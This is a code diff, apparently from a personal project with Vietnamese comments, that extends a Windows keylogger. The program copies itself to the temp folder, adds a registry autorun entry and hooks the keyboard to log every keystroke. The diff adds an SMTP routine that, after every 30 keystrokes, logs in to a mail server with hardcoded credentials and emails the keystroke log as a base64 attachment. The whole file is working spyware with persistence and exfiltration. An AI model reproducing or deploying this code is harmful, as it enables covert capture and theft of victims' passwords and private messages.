@@ -1,23 +1,46 @@
 ﻿
-#include <Windows.h>
+#define _BASE64_H_
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <wincrypt.h>
+#include "base64.h"
+#include <shellapi.h>
+// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
+#pragma comment (lib, "Ws2_32.lib")
+#pragma comment (lib, "Crypt32.lib")
+#pragma comment (lib, "Mswsock.lib")
+#pragma comment (lib, "AdvApi32.lib")
+#pragma warning(disable : 4996)
 
-
+#define DEFAULT_BUFLEN 512
+#define DEFAULT_PORT "587"
 LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+//DWORD WINAPI MailSending(LPVOID lParam);
+
+BOOL sendrequest(SOCKET ConnectSocket, const char* Buffer);
+BOOL recvMail(SOCKET Socket);
+int MailSending();
 
 
+int g_time = 0;
 HANDLE g_hLogFile;
 HANDLE g_hExeFile;
 HANDLE g_hExeTempFile;
 HWND g_hWActiveOld = 0, g_hWActiveNew;
 HINSTANCE z;
+WCHAR g_LogPath[MAX_PATH] = { 0 };
+using namespace std;
 //------------------Main
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
     WCHAR TempPath[MAX_PATH] = { 0 }; // Đặt = {0} thì sizeof() +0, ngược lại sizeof() +1
-    WCHAR LogPath[MAX_PATH] = { 0 };
+
     WCHAR ExePath[MAX_PATH] = { 0 };
     WCHAR ExeTempPath[MAX_PATH] = { 0 };
     WCHAR ExeDelPath[MAX_PATH] = { 0 };
@@ -26,8 +49,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
     
     GetTempPath(MAX_PATH, TempPath);
 
-    lstrcat(LogPath, TempPath);
-    lstrcat(LogPath, L"keylog.log");
+    lstrcat(g_LogPath, TempPath);
+    lstrcat(g_LogPath, L"keylog.log");
     lstrcat(ExeTempPath, TempPath);
     lstrcat(ExeTempPath, L"keylog.exe");
 
@@ -73,24 +96,20 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
             int i = RegSetValueEx(hkey, L"Keylog", NULL, REG_SZ, (const BYTE*)ExeTempPath, lstrlen(ExeTempPath) * sizeof(WCHAR)+1);
             RegCloseKey(hkey);
             //  Mở File Log để Ghi
-            g_hLogFile = CreateFile(LogPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
+            g_hLogFile = CreateFile(g_LogPath, GENERIC_ALL,FILE_SHARE_WRITE|FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
             HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MsgProc, NULL, 0);// Bắt đầu HOOK
+            //Sleep(10000);
+            //HANDLE ThreadMail = CreateThread(0, 0, MailSending, 0, 0, 0);
         }
 
     }
-    
-    //if ((hExeDel = CreateFile(ExeDelPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
-    //{
-    //    ZeroMemory(ExeDelPath, sizeof(ExeDelPath));
-    //    result = ReadFile(hExeDel, ExeDelPath, sizeof(ExeDelPath), &sizeRW, 0);
-    //}
 
-     // Create Log File
 
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) > 0)
     {
+
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
@@ -109,7 +128,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     KBDLLHOOKSTRUCT* KeyStruct = (KBDLLHOOKSTRUCT*)lParam;
-    
+
     WCHAR namekey[65];
     WCHAR NameWindow[255];
     DWORD sizewrited = 0;
@@ -133,15 +152,215 @@ LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam)
         result = GetKeyNameTextW(KeyStruct->scanCode << 16, (LPWSTR)namekey, 65);
         lstrcat(namekey, L" ");
         result = WriteFile(g_hLogFile, &namekey,sizeof(WCHAR) * (lstrlen(namekey)), &sizewrited,0 );
+        g_time += 1;
+        if (g_time == 30)
+        {
+            SetFilePointer(g_hLogFile, 0, 0, FILE_BEGIN);
+            MailSending();
+            SetFilePointer(g_hLogFile, 0, 0, FILE_END);
+            //MessageBoxA(0, "sendmail", "asd", MB_OK);
+            g_time = 0;
+        }
         break;
     }
     default:
         break;
     }
 
+
+
     return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
+int MailSending()
+{
+    //LPVOID* hand = (LPVOID*)lParam;
+    
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    struct addrinfo* result = NULL,
+        * ptr = NULL,
+        hints;
+    const char* sendbuf = "EHLO";
+    char recvbuf[DEFAULT_BUFLEN];
+
+    int iResult;
+    int recvbuflen = DEFAULT_BUFLEN;
+        // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        printf("WSAStartup failed with error: %d\n", iResult);
+        return 1;
+    }
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = 0;
+
+    // Resolve the server address and port
+    iResult = getaddrinfo("mail.google.com", DEFAULT_PORT, &hints, &result);
+    if (iResult != 0) {
+        printf("getaddrinfo failed with error: %d\n", iResult);
+        WSACleanup();
+        return 1;
+    }
+    // Attempt to connect to an address until one succeeds
+    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
+
+        // Create a SOCKET for connecting to server
+        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
+            ptr->ai_protocol);
+        if (ConnectSocket == INVALID_SOCKET) {
+            printf("socket failed with error: %ld\n", WSAGetLastError());
+            WSACleanup();
+            return 1;
+        }
+
+        // Connect to server.
+        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        if (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            continue;
+        }
+        break;
+    }
+
+    freeaddrinfo(result);
+
+    if (ConnectSocket == INVALID_SOCKET) {
+        printf("Unable to connect to server!\n");
+        WSACleanup();
+        return 1;
+    }
+    char Account[255] = "anhdz@gmail.com";
+    char Password[255] = "chiu";
+
+    //char HeaderData[1024] = "Subject:AnhDVd\r\nMIME - Version: 1.0\r\nContent - Type : multipart / mixed; boundary = \"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq\r\nContent - Type:application / octet - stream\; name = \"Keylog.txt\"\r\nContent - Transfer - Encoding:base64\r\nContent - Disposition : attachment\; filename = \"Keylog.txt\"\r\n";
+
+    // Account
+    //int i = CryptStringToBinaryA((LPCSTR)Account, 0, CRYPT_STRING_ANY, (BYTE*)StrBase64, &StrBaseLen, 0, 0);
+
+    recvMail(ConnectSocket);
+    char SendTemp[512] = "EHLO anhdvd\r\n";
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+    //Gui request Login
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, "AUTH LOGIN\r\n");
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+    //Mahoa base64
+    string strAccount;
+    string strPassword;
+    strAccount = base64_encode((unsigned char*)Account, strlen((const char*)Account));
+    strAccount += "\r\n";
+    strPassword = base64_encode((unsigned char*)Password, strlen((const char*)Password));
+    strPassword += "\r\n";
+
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, (LPCSTR)strAccount.c_str());
+    //lstrcpyA(SendTemp,)
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+    //Pass
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, (LPCSTR)strPassword.c_str());
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+    //Send Mail 
+    //FROM-----------------------------------------------------------------
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, "MAIL FROM:<anhdvd@bkav.com>\r\n");
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+
+    // TO------------------------------------------------
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, "RCPT TO:<anhdvd@bkav.com>\r\n");
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+    //--------------------------------DATA---------------------------
+    //hExeDel = CreateFile(ExeDelPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)
+    //DATA
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, "DATA\r\n");
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+
+    // Nối text ở đâyyyyyyyyyyyyyyyyyyyyyyyyyy
+    char ReadtxtData[5000] = { 0 };
+    DWORD sizeRW = 0;
+    char DataTemp[5000];
+    string filebase64;
+
+    ZeroMemory(DataTemp, sizeof(DataTemp));
+    //***************************************************** Tách từng dung để Attach *****************************
+    iResult = send(ConnectSocket, "MIME-Version: 1.0\r\n", (int)strlen("MIME-Version: 1.0\r\n"), 0);
+    iResult = send(ConnectSocket, "Content-Type:multipart/mixed;boundary=\"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n", (int)strlen("Content-Type:multipart/mixed;boundary=\"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n"), 0);
+    iResult = send(ConnectSocket, "--KkK170891tpbkKk__FV_KKKkkkjjwq\r\n", (int)strlen("--KkK170891tpbkKk__FV_KKKkkkjjwq\r\n"), 0);
+    iResult = send(ConnectSocket, "Content-Type:application/octet-stream;name=\"Keylog.txt\"\r\n", (int)strlen("Content-Type:application/octet-stream;name=\"Keylog.txt\"\r\n"), 0);
+    iResult = send(ConnectSocket, "Content-Transfer-Encoding:base64\r\n", (int)strlen("Content-Transfer-Encoding:base64\r\n"), 0);
+    iResult = send(ConnectSocket, "Content-Disposition:attachment;filename=\"Keylog.txt\"\r\n", (int)strlen("Content-Disposition:attachment;filename=\"Keylog.txt\"\r\n"), 0);
+    iResult = send(ConnectSocket, "\r\n", (int)strlen("\r\n"), 0);
+    // **************** ĐỌC FILE LẤY TEXT RỒI -> BASE64****************************************
+    //HANDLE hTxt = CreateFileW(g_LogPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+
+    ReadFile(g_hLogFile, ReadtxtData, 5000, &sizeRW, 0);
+    //zerr = GetLastError();
+    filebase64 = base64_encode((unsigned char*)ReadtxtData, sizeRW);//strlen((const char*)ReadtxtData)
+    //****************************SEND TEXT
+    ZeroMemory(DataTemp, sizeof(DataTemp));
+    lstrcatA(DataTemp, filebase64.c_str());
+    lstrcatA(DataTemp, "\r\n");
+    sendrequest(ConnectSocket, DataTemp);
+    //lstrcatA(DataTemp, "\n.\r\n");
+    sendrequest(ConnectSocket, ".\r\n");
+    recvMail(ConnectSocket);
+    //********* QUIT***********************
+    ZeroMemory(SendTemp, sizeof(SendTemp));
+    lstrcatA(SendTemp, "QUIT\r\n");
+    sendrequest(ConnectSocket, SendTemp);
+    recvMail(ConnectSocket);
+
+    Sleep(10000);
+    closesocket(ConnectSocket);
+    WSACleanup();
+    
+
+    return 0;
+}
+
+BOOL sendrequest(SOCKET Socket, const char* Buffer)
+{
+    int iResult;
+    iResult = send(Socket, Buffer, (int)strlen(Buffer), 0);
+    if (iResult == SOCKET_ERROR)
+    {
+        printf("send failed with error: %d\n", WSAGetLastError());
+        closesocket(Socket);
+        WSACleanup();
+        return 1;
+    }
+    return 1;
+}
+
+BOOL recvMail(SOCKET Socket)
+{
+    int iResult;
+    char recvbuf[DEFAULT_BUFLEN];
+    int recvbuflen = DEFAULT_BUFLEN;
+    ZeroMemory(recvbuf, sizeof(recvbuf));
+    iResult = recv(Socket, recvbuf, recvbuflen, 0);
+    if (iResult > 0)
+        printf("%s\n", recvbuf);
+    else if (iResult == 0)
+        printf("Connection closed\n");
+    else
+        printf("recv failed with error: %d\n", WSAGetLastError());
+    return 1;
+}
 //// Mở file exe hiện tại và copy vào temp
 //// HANDLE TempFile Set chế độ Write
 //g_hExeTempFile = CreateFile(ExeTempPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, 0);
